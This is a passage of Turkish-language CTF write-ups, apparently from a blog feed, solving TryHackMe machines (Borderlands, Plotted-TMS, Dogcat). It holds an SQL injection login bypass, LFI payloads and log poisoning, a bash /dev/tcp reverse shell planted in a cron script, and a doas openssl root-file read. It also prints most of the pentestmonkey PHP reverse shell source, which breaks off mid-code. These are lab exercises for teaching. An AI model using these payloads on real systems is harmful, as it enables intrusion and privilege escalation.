4f4ced90fcad774ca4f9f966dbb227ebe7f77a83index.php</span><br><span class="line">100644 blob 6480abf34a54d3055b437766be872a13bcebdf7dinfo.php</span><br></pre></td></tr></table></figure><p>Artık elimde önemli dosyaların objeleri var. Flaglerden biri<code>api.php</code>, diğeri<code>home.php</code> içinde saklı. Önceki adımları tekrarlayarak web ve api flag’lerini buluyorum.</p><p><a href="https://ordersixtyfix.github.io/2022/02/27/THM-Borderlands-Cozum-Bolum-2/">Bölüm-2</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF Çözüm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM Plotted-TMS Çözüm</title>
      <link href="/2022/02/23/THM-Plotted-TMS-Cozum/"/>
      <url>/2022/02/23/THM-Plotted-TMS-Cozum/</url>
      
        <content type="html"><![CDATA[<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><hr><p>Nmap taramasıyla başlıyorum.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV 10.10.106.251</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-22 23:03 +03</span><br><span class="line">Nmap scan report for 10.10.106.251</span><br><span class="line">Host is up (0.097s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.88 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>80 ve 445 portlarında apache sunucu barınıyor ve site <code>PHPSESSID</code>‘den anladığım kadarıyla php ile kodlanmış. Tarayıcıda siteyi açtığımda öntanımlı apache sayfası var.<code>dirb</code> ile sunucudaki alt dizinleri listelemek mantıklı.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dirb 10.10.106.251</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.106.251/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.106.251/admin/                                           </span><br><span class="line">+ http://10.10.106.251/index.html (CODE:200|SIZE:10918)                              </span><br><span class="line">+ http://10.10.106.251/passwd (CODE:200|SIZE:25)                                     </span><br><span class="line">+ http://10.10.106.251/server-status (CODE:403|SIZE:278)                             </span><br><span class="line">+ http://10.10.106.251/shadow (CODE:200|SIZE:25)                                     </span><br><span class="line">                                                      </span><br></pre></td></tr></table></figure><span id="more"></span><p>İşe yarar bir şey yok. Bir de 445 portuna göz atacağım.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 10.10.106.251:445</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DIRECTORY: http://10.10.106.251:445/management/</span><br></pre></td></tr></table></figure><p>mangement dizini altında bir web sitesi barınıyor.</p><h1 id="EXPLOITATION"><a href="#EXPLOITATION" class="headerlink" title="EXPLOITATION"></a>EXPLOITATION</h1><hr><p>Bu dizin işe yarayacak gibi. Login’e tıkladığımda admin giriş paneli geliyor karşıma. İlk denediğim şey admin-admin ile giriş yapmaya çalışmak ama işe yaramıyor. SQLi işe yarayabilir.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username : admin&#x27; OR &#x27;1&#x27;=&#x27;1-- -</span><br><span class="line">password : $RASTGELE</span><br></pre></td></tr></table></figure><p>username kısmına girdi olarak yazdığım <code>admin&#39; OR &#39;1&#39;=&#39;1-- -</code> ifadesini parçalara ayırırsam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; =&gt; admin olarak giriş yapmak için,</span><br><span class="line">OR &#x27;1&#x27;=&#x27;1 =&gt; SQL sorgusunun her zaman doğru olması için,</span><br><span class="line">-- - =&gt; bu ifadeden sonrasının SQL sorgusuna dahil edilmemesi için. </span><br><span class="line">Yani girdiğim password&#x27;un hiçbir önemi yok.</span><br></pre></td></tr></table></figure><p>Artık giriş yaptım. Panelde dolaşırken avatarımı değiştirebildiğimi farkettim(<a href="http://10.10.224.198:445/management/admin/?page=user">http://10.10.224.198:445/management/admin/?page=user</a>). Bu atak vektöründen ilerleyerek reverse shell alabilirim. Php ile reverse shell almak mantıklı olur.</p><p>Bu <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">kod</a> işimi görür. Portu 1234 seçtim.Siz $port ve $ip kısımlarını kendinize göre düzenleyeceksiniz. Önce <code>nc -lvnp 1234</code> ile 1234 portunu dinlemeye alıyorum. Ardından shell.php dosyamı seçiyorum ve update’e bastığımda reverse shell, dinlemeye aldığım 1234 portuna geldi.</p><h1 id="PRIV-ESC"><a href="#PRIV-ESC" class="headerlink" title="PRIV ESC"></a>PRIV ESC</h1><hr><p>İlk denediğim şey sudo ile çalıştırabileceğim komutları bulmak. Fakat işe yarar bir şey yok. SUID ve GUID bitlerinden de bir şey çıkmadı. Crontab dosyasından belki bir şeyler yakalayabilirim. Bu dosyada periyodik olarak çalıştırılan <a href="https://ceaksan.com/tr/cronjob-nedir-nasil-kullanilir">cronjob</a>‘ların listesi var. <code>cat /etc/crontab</code> ile dosya içeriğini okuduğumda plot_admin kullanıcısı tarafından her dakika çalıştırılan <code>/var/www/scripts/backup.sh</code> dikkatimi çekti. <code>ls -la</code> ile scripts dizini üzerindeki yetkime baktığımda:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  4 root     root     4096 Oct 28 10:26 .</span><br><span class="line">drwxr-xr-x 14 root     root     4096 Oct 28 07:07 ..</span><br><span class="line">drwxr-xr-x  4 root     root     4096 Oct 28 09:18 html</span><br><span class="line">drwxr-xr-x  2 www-data www-data 4096 Oct 28 09:10 scripts</span><br></pre></td></tr></table></figure><p>dizin üzerinde yetki sahibiyim. Bu da demek oluyor ki backup.sh dosyasını silebilir, yeni bir backup.sh dosyası oluşturup plot_admin kullanıcısı olarak reverse shell almamı sağlayacak bir bash kodu yerleştirebilirim. Önce 5555 portunu <code> nc -lvnp 5555</code> ile dinlemeye aldım . Ardından <code>rm -rf *</code> ile var/www/scripts içindeki backup.sh’ı sildim ve<code>echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.8.216.50/5555 0&gt;&amp;1&#39;&quot; &gt; backup.sh</code> ile backup.sh içine reverse shell almamı sağlayacak kodu yerleştirdim. <code>chmod +x backup.sh</code> ile dosyaya çalıştırma izni verdikten sonra tek yapmam gereken beklemek.</p></br><p>plot_admin olarak shell aldım. İlk yaptığım şey gene <code>sudo -l</code> denemek fakat işe yaramadı. SUID ve GUID bitlerine sahip dosyalara baktığımda. <code>/usr/bin/doas</code> ilgimi çekti çünkü <code>doas</code>, sudo gibi sistemdeki başka bir kullanıcının kimliğini üstlenmek için kullanılabilir. <code>cat /etc/doas.conf</code> ile config dosyasını okuduğumda <code>openssl</code>‘i root yetkisiyle çalıştırabileceğimi öğrendim. Artık son flag’i de gtfobins’den bulduğum openssl ile dosya okumama olanak sağlayan komut ile okuyabilirim.<code>doas openssl enc -in /root/root.txt</code>.</p>]]></content>
      
      
      <categories>
          
          <category> CTF Çözüm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SUID, GUID </tag>
            
            <tag> SQLi </tag>
            
            <tag> Crontab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM Dogcat Çözüm</title>
      <link href="/2022/02/16/THM-Dogcat-Cozum/"/>
      <url>/2022/02/16/THM-Dogcat-Cozum/</url>
      
        <content type="html"><![CDATA[<p><a href="https://tryhackme.com/room/dogcat">Makine Linki</a></p><h1 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h1><hr><p>Nmap taramasıyla makineyı çözümlemeye başlıyorum.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV 10.10.227.89</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-16 23:34 +03</span><br><span class="line">Nmap scan report for 10.10.227.89</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds</span><br></pre></td></tr></table></figure><p>80 portunda bir apache web sunucusu var. Siteye girdiğimde dog ve cat adında iki seçenek var. Seçenekler önümüze rastgele(!) kedi veya köpek fotoğrafları çıkartıyor. URL’ye baktığım zaman <a href="https://aycaakcay.medium.com/file-inclusion-nedir-da2f2218383f">LFI(Local File Inclusion)</a>‘a müsait olabileceğini düşünüyorum çünkü web sitesin çalışma prensibi sunucudaki dosyaları çağırmak üzerine. </p><pre><code>http://10.10.227.89/?view=dog</code></pre></br>    <p>İlk denediğim şey sistemdeki kullanıcıları görmek için <code>etc/passwd</code> ‘ye erişmek.</p><pre><code>http://10.10.227.89/?view=dog/../../../../etc/passwd</code></pre></br>    <p>Site error mesajı döndürdüğünden LFI olduğuna artık eminim.</p><pre><code>Warning: include(dog/../../../../etc/passwd.php): failed to open stream: No such file or         directory in /var/www/html/index.php on line 24Warning: include(): Failed opening &#39;dog/../../../../etc/passwd.php&#39; for inclusion         (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 24</code></pre></br><span id="more"></span><h1 id="EXPLOITATION"><a href="#EXPLOITATION" class="headerlink" title="EXPLOITATION"></a>EXPLOITATION</h1><hr><p>Error mesajında girdiye “.php” uzantısı eklediğini fark ettim. Php için LFI tekniklerini araştırdığımda <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">PHP wrappers</a>‘a denk geldim.<code>php://filter</code> kullanarak index dosyasını okuyabilir ve sitenin çalışma prensibini daha iyi anlayabilirim. Bunun için kullanacağım payload:<br></br></p><pre><code>http://10.10.227.89/?view=php://filter/convert.base64-encode/resource=dog/../index</code></pre></br><p>Sitenin geri dönütündeki base64 çıktısını decode ettiğimde artık elimde index dosyasının içeriği var.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;dogcat&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;dogcat&lt;/h1&gt;</span><br><span class="line">    &lt;i&gt;a gallery of various dogs or cats&lt;/i&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;What would you like to see?&lt;/h2&gt;</span><br><span class="line">        &lt;a href=&quot;/?view=dog&quot;&gt;&lt;button id=&quot;dog&quot;&gt;A dog&lt;/button&gt;&lt;/a&gt; &lt;a href=&quot;/?view=cat&quot;&gt;&lt;button id=&quot;cat&quot;&gt;A cat&lt;/button&gt;&lt;/a&gt;&lt;br&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            function containsStr($str, $substr) &#123;</span><br><span class="line">                return strpos($str, $substr) !== false;</span><br><span class="line">            &#125;</span><br><span class="line">    $ext = isset($_GET[&quot;ext&quot;]) ? $_GET[&quot;ext&quot;] : &#x27;.php&#x27;;</span><br><span class="line">            if(isset($_GET[&#x27;view&#x27;])) &#123;</span><br><span class="line">                if(containsStr($_GET[&#x27;view&#x27;], &#x27;dog&#x27;) || containsStr($_GET[&#x27;view&#x27;], &#x27;cat&#x27;)) &#123;</span><br><span class="line">                    echo &#x27;Here you go!&#x27;;</span><br><span class="line">                    include $_GET[&#x27;view&#x27;] . $ext;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    echo &#x27;Sorry, only dogs or cats are allowed.&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kaynak kod’da ext değişkenin belirtilmediği takdirde “php” olarak varsayılacağını anladım, yani ext değişkenini manipüle edebilirim.</p><pre><code>http://10.10.227.89/?view=dog/../../../../etc/passwd&amp;ext=</code></pre><p>Artık passwd dosyasını okuyabiliyorum. Fakat asıl işime yarayacak metot <a href ="https://www.youtube.com/watch?v=bPrSSScB4-c">Log Poisoning</a>. Bu sayede log dosyasına hangi request header’ların dahil edildiğini tespit edebilir, devamında belki bu parametrede bir php kodu çalıştırabilirim. Bunun için apache log dosyasını açıyorum:</p><pre><code>http://10.10.221.0/?view=cat../../../../../var/log/apache2/access.log&amp;ext=</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.8.216.50 - - [17/Feb/2022:17:23:33 +0000] &quot;GET /?view=cat../../../../../var/log/apache2/access.log&amp;ext= HTTP/1.1&quot; 200 742 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&quot;</span><br><span class="line">10.8.216.50 - - [17/Feb/2022:17:23:33 +0000] &quot;GET /style.css HTTP/1.1&quot; 200 698 &quot;http://10.10.116.202/?view=cat../../../../../var/log/apache2/access.log&amp;ext=&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&quot;</span><br><span class="line">10.8.216.50 - - [17/Feb/2022:17:23:33 +0000] &quot;GET /favicon.ico HTTP/1.1&quot; 404 491 &quot;http://10.10.116.202/?view=cat../../../../../var/log/apache2/access.log&amp;ext=&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&quot;</span><br></pre></td></tr></table></figure><p>User-agent <code>encode edilmemiş bir şekilde</code> log dosyasında saklanıyor<code>(Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0)</code>. Bu da demek oluyor ki user-agent parametresine bir php kodu yerleştirip çalıştırılmasını sağlayabilirim.</p><p>İlk önce php için bir reverse shell kodu buldum:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="line">// for any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// for damage caused by this tool.  If these terms are not acceptable to you, then</span><br><span class="line">// do not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed in the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License for more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; if not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="line">// for any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, then do not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line">$VERSION = &quot;1.0&quot;;</span><br><span class="line">$ip = &#x27;10.8.216.50&#x27;;  // CHANGE THIS</span><br><span class="line">$port = 1234;       // CHANGE THIS</span><br><span class="line">$chunk_size = 1400;</span><br><span class="line">$write_a = null;</span><br><span class="line">$error_a = null;</span><br><span class="line">$shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;</span><br><span class="line">$daemon = 0;</span><br><span class="line">$debug = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself if possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line">if (function_exists(&#x27;pcntl_fork&#x27;)) &#123;</span><br><span class="line">// Fork and have the parent process exit</span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"></span><br><span class="line">if ($pid == -1) &#123;</span><br><span class="line">printit(&quot;ERROR: Can&#x27;t fork&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($pid) &#123;</span><br><span class="line">exit(0);  // Parent exits</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Make the current process a session leader</span><br><span class="line">// Will only succeed if we forked</span><br><span class="line">if (posix_setsid() == -1) &#123;</span><br><span class="line">printit(&quot;Error: Can&#x27;t setsid()&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$daemon = 1;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line">chdir(&quot;/&quot;);</span><br><span class="line"></span><br><span class="line">// Remove any umask we inherited</span><br><span class="line">umask(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) &#123;</span><br><span class="line">printit(&quot;$errstr ($errno)&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from</span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line">if (!is_resource($process)) &#123;</span><br><span class="line">printit(&quot;ERROR: Can&#x27;t spawn shell&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line"></span><br><span class="line">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"></span><br><span class="line">while (1) &#123;</span><br><span class="line">// Check for end of TCP connection</span><br><span class="line">if (feof($sock)) &#123;</span><br><span class="line">printit(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Check for end of STDOUT</span><br><span class="line">if (feof($pipes[1])) &#123;</span><br><span class="line">printit(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Wait until a command is end down $sock, or some</span><br><span class="line">// command output is available on STDOUT or STDERR</span><br><span class="line">$read_a = array($sock, $pipes[1], $pipes[2]);</span><br><span class="line">$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span><br><span class="line"></span><br><span class="line">// If we can read from the TCP socket, send</span><br><span class="line">// data to process&#x27;s STDIN</span><br><span class="line">if (in_array($sock, $read_a)) &#123;</span><br><span class="line">if ($debug) printit(&quot;SOCK READ&quot;);</span><br><span class="line">$input = fread($sock, $chunk_size);</span><br><span class="line">if ($debug) printit(&quot;SOCK: $input&quot;);</span><br><span class="line">fwrite($pipes[0], $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// If we can read from the process&#x27;s STDOUT</span><br><span class="line">// send data down tcp connection</span><br><span class="line">if (in_array($pipes[1], $read_a)) &#123;</span><br><span class="line">if ($debug) printit(&quot;STDOUT READ&quot;);</span><br><span class="line">$input = fread($pipes[1], $chunk_size);</span><br><span class="line">if ($debug) printit(&quot;STDOUT: $input&quot;);</span><br><span class="line">fwrite($sock, $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// If we can read from the process&#x27;s STDERR</span><br><span class="line">// send data down tcp connection</span><br><span class="line">if (in_array($pipes[2], $read_a)) &#123;</span><br><span class="line">if ($debug) printit(&quot;STDERR READ&quot;);</span><br><span class="line">$input = fread($pipes[2], $chunk_size);</span><br><span class="line">if ($debug) printit(&quot;STDERR: $input&quot;);</span><br><span class="line">fwrite($sock, 